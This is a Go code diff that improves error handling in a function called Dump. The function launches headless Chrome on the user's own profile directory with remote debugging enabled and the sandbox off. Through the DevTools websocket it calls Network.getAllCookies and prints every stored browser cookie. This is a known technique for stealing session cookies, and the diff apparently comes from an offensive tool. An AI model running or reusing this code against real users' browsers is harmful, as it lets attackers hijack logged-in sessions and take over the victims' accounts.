@@ -52,6 +52,10 @@ func getOsSpecificPaths() (string, string) {
 
 func Dump() {
 	userDataDir, chromePath := getOsSpecificPaths()
+	if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
+		fmt.Printf("%s is not a valid path. Missing some $HOME variable?\n", userDataDir)
+		return
+	}
 	cmd := exec.Command(chromePath, "--headless", "--user-data-dir="+userDataDir, "--remote-debugging-port=9222", "--no-sandbox")
 
 	err := cmd.Start()
@@ -63,6 +67,7 @@ func Dump() {
 	resp, err := http.Get("http://localhost:9222/json")
 	if err != nil {
 		fmt.Printf("[!] error contacting chrome debugger: %v", err)
+		cmd.Process.Kill()
 		return
 	}
 	bodyBytes, err := ioutil.ReadAll(resp.Body)
@@ -70,6 +75,7 @@ func Dump() {
 	err = json.Unmarshal(bodyBytes, &result)
 	if err != nil {
 		fmt.Printf("[!] error unmarshalling json: %v", err)
+		cmd.Process.Kill()
 		return
 	}
 	websocketURL := fmt.Sprintf("%v", result[0]["webSocketDebuggerUrl"])
@@ -77,6 +83,7 @@ func Dump() {
 	err = conn.WriteMessage(websocket.TextMessage, []byte("{\"id\": 1, \"method\": \"Network.getAllCookies\"}"))
 	if err != nil {
 		fmt.Printf("[!] could not write to websocket: %v", err)
+		cmd.Process.Kill()
 		return
 	}
 	var data string
@@ -100,7 +107,9 @@ func Dump() {
 	var buf bytes.Buffer
 	err = json.Indent(&buf, []byte(data), "", " ")
 	if err != nil {
+		cmd.Process.Kill()
 		return
 	}
 	fmt.Println(buf.String())
+	cmd.Process.Kill()
 }
